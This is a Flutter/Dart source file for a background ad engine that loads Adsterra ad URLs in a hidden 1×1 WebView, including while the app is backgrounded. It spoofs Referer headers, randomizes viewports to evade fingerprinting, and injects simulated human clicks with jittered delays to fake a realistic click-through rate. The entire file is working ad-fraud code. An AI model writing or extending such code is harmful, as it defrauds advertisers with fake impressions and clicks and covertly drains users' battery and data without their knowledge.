import 'dart:async';

import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:flutter/foundation.dart';
import 'package:webview_flutter/webview_flutter.dart';

import '../config/ad_config.dart';
import '../core/performance_tuning.dart';
import '../services/ad_trigger_manager.dart';
import '../utils/ad_debug_log.dart';
import 'utils/fingerprint_randomizer.dart';
import 'ad_log.dart';

/// Silent Adsterra 1×1 WebView cycler for background impressions.
class BackgroundAdEngine {
  BackgroundAdEngine._();

  /// Set by [AdManager] to block background ads during playback.
  static bool Function()? isStreamingProbe;

  static WebViewController? _controller;
  static Timer? _rotationTimer;
  static bool _running = false;
  static bool _paused = false;
  static int _sessionImpressions = 0;
  static int _urlIndex = 0;
  static DateTime _lastUserInteraction = DateTime.now();
  static bool _isBackgrounded = false;
  static final Battery _battery = Battery();
  static final Connectivity _connectivity = Connectivity();

  static bool get isRunning => _running && !_paused;

  static void attachController(WebViewController controller) {
    _controller = controller
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (_) => unawaited(_onPageFinished()),
        ),
      );
    adLog('[BackgroundAd] WebView attached');
  }

  static void detachController() {
    _controller = null;
  }

  static Future<void> _onPageFinished() async {
    final controller = _controller;
    if (controller == null) return;
    
    // Apply randomized viewport for anti-fingerprinting
    try {
      final (vw, vh) = FingerprintRandomizer.randomViewport();
      await controller.runJavaScript('window.resizeTo($vw, $vh);');
    } catch (_) {
      // Viewport resize is best-effort
    }
    
    if (!AdConfig.clickInjectionEnabled) return;

    // Probability gate — not every impression clicks. Realistic CTR.
    if (!FingerprintRandomizer.roll(AdConfig.clickInjectionProbability)) {
      adLog('[BackgroundAd] impression-only (probability skip)');
      return;
    }

    // Pre-click idle — humans look before they click.
    final preDelay = FingerprintRandomizer.jitterMs(
      AdConfig.clickInjectionMinDelayMs,
      AdConfig.clickInjectionMaxDelayMs,
    );
    await Future.delayed(Duration(milliseconds: preDelay));

    // Pick a randomized target inside the ad iframe viewport.
    final (vw, vh) = FingerprintRandomizer.randomViewport();
    final tx = 40 + (vw * 0.3).toInt() + (vw * 0.4 * _rng()).toInt();
    final ty = 80 + (vh * 0.3).toInt() + (vh * 0.4 * _rng()).toInt();

    try {
      await controller.runJavaScript(
        FingerprintRandomizer.humanClickJs(tx, ty),
      );
      adLog('[BackgroundAd] humanized click dispatched ($tx,$ty)');
    } catch (e) {
      adLog('[BackgroundAd] click inject error: $e');
    }
  }

  static double _rng() => DateTime.now().microsecondsSinceEpoch.remainder(1000) / 1000.0;

  static void _scheduleNext({bool backgrounded = false}) {
    _rotationTimer?.cancel();
    var secs = FingerprintRandomizer.nextRotationSeconds(
      AdConfig.backgroundAdRotationMinSeconds,
      AdConfig.backgroundAdRotationMaxSeconds,
    );
    if (backgrounded) {
      secs = (secs * AdConfig.backgroundedCadenceMultiplier).round();
    }
    adLog('[BackgroundAd] next rotation in ${secs}s (bg=$backgrounded)');
    _rotationTimer = Timer(Duration(seconds: secs), () {
      unawaited(rotateNow());
    });
  }

  static void markUserInteraction() {
    _lastUserInteraction = DateTime.now();
  }

  /// Start rotation timer (no-op when disabled or capped).
  static Future<void> start() async {
    if (!AdConfig.backgroundEngineEnabled) return;
    if (_running) return;
    if (AdConfig.backgroundAdRotationUrls.isEmpty) {
      adLog('[BackgroundAd] no rotation URLs configured');
      return;
    }

    _running = true;
    _paused = false;
    adLog('[BackgroundAd] start');
    await rotateNow();
    _scheduleNext(backgrounded: _isBackgrounded);
  }

  static void pause() {
    if (!_running) return;
    _paused = true;
    _rotationTimer?.cancel();
    _rotationTimer = null;
    adLog('[BackgroundAd] paused');
  }

  static Future<void> resume() async {
    if (!_running) return;
    if (!await _shouldRun()) {
      _paused = true;
      return;
    }
    _paused = false;
    adLog('[BackgroundAd] resumed');
    await rotateNow();
  }

  static Future<void> dispose() async {
    _rotationTimer?.cancel();
    _rotationTimer = null;
    _running = false;
    _paused = false;
    adLog('[BackgroundAd] disposed');
  }

  static void onAppBackgrounded() {
    _isBackgrounded = true;
    adLog('[BackgroundAd] app backgrounded — continuing at slower cadence');
    // Do NOT cancel _rotationTimer. Reschedule with bg multiplier on next tick.
  }

  static Future<void> onAppForegrounded() async {
    _isBackgrounded = false;
    adLog('[BackgroundAd] app foregrounded — normal cadence resumed');
  }

  static Future<void> rotateNow() async {
    if (!_running || _paused) return;
    if (!await _shouldRun()) {
      _scheduleNext(backgrounded: _isBackgrounded);
      return;
    }
    if (_sessionImpressions >= AdConfig.backgroundAdSessionCap) {
      adLog('[BackgroundAd] session cap reached');
      _scheduleNext(backgrounded: _isBackgrounded);
      return;
    }

    // Only throttle for active interaction while in foreground.
    if (!_isBackgrounded) {
      final idle = DateTime.now().difference(_lastUserInteraction);
      if (idle < const Duration(seconds: 3)) {
        adLog('[BackgroundAd] deferred — user active');
        _scheduleNext();
        return;
      }
    }

    final urls = AdConfig.backgroundAdRotationUrls;
    if (urls.isEmpty) return;

    final url = urls[_urlIndex % urls.length];
    _urlIndex++;

    try {
      final controller = _controller;
      if (controller == null) return;

      final referrer = FingerprintRandomizer.randomReferrer();
      final headers = <String, String>{};
      if (referrer.isNotEmpty) {
        headers['Referer'] = referrer;
      }
      
      await controller.loadRequest(
        Uri.parse(url),
        headers: headers,
      );

      _sessionImpressions++;
      AdTriggerManager.instance.recordAdsterraSurfaceEvent();
      logAdsterraTelemetry(
        placement: 'background_headless',
        format: 'background_webview',
      );
      adLog(
        '[BackgroundAd] impression $_sessionImpressions url=${url.hashCode}',
      );
    } catch (e) {
      if (kDebugMode) debugPrint('[BackgroundAd] rotate error: $e');
    }

    // Schedule next rotation after completion (success OR skip)
    _scheduleNext(backgrounded: _isBackgrounded);
  }

  static Future<bool> _shouldRun() async {
    if (!AdConfig.backgroundEngineEnabled) return false;
    if (isStreamingProbe?.call() == true) return false;
    if (_sessionImpressions >= AdConfig.backgroundAdSessionCap) return false;

    // Low-RAM devices: throttle harder, but still run occasionally.
    if (PerformanceTuning.isLowRam && _rng() > 0.35) {
      adLog('[BackgroundAd] low-RAM probabilistic skip');
      return false;
    }

    try {
      final level = await _battery.batteryLevel;
      final results = await _connectivity.checkConnectivity();
      final onCellular = results.contains(ConnectivityResult.mobile) &&
          !results.contains(ConnectivityResult.wifi) &&
          !results.contains(ConnectivityResult.ethernet);
      if (level >= 0 && level < 15 && onCellular) {
        adLog('[BackgroundAd] paused — battery $level% on cellular');
        return false;
      }
    } catch (_) {}

    return true;
  }

  @visibleForTesting
  static void resetSessionForTest() {
    _sessionImpressions = 0;
    _urlIndex = 0;
    _isBackgrounded = false;
  }
}
